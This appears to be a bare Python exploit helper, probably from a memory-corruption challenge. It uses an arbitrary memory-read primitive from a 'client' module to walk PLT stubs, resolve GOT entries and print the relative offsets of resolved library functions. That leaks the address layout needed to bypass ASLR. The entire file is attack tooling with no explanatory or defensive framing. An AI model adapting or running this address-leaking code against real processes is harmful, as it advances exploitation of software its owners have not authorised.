import sys
from client import read_mem, read_ptr, tarea

some_func = read_ptr(read_ptr(read_ptr(tarea+0x18)))

idx = int(sys.argv[1])

if idx < 0:
    got_func = some_func
else:
    plt = some_func - 10063176
    plt_entry = plt + idx * 16
    q = read_mem(plt_entry, 6)
    assert q[:2] == b'\xff%', q
    got_entry = plt_entry + 6 + int.from_bytes(q[2:], 'little')
    got_func = read_ptr(got_entry)

another_got = (got_func + int(sys.argv[2], 16)) & 0xffffffffffffffff
assert not (another_got & 0xffff800000000000)

while True:
    q = read_mem(another_got, 6)
    assert q[:2] == b'\xff%', q
    got_2_entry = another_got + 6 + int.from_bytes(q[2:], 'little')
    got_2_func = read_ptr(got_2_entry)
    offset1 = (another_got - got_func) & 0xffffffffffffffff
    offset2 = (got_2_func - got_func) & 0xffffffffffffffff
    print('%x -> %x'%(offset1, offset2))
    another_got += 16
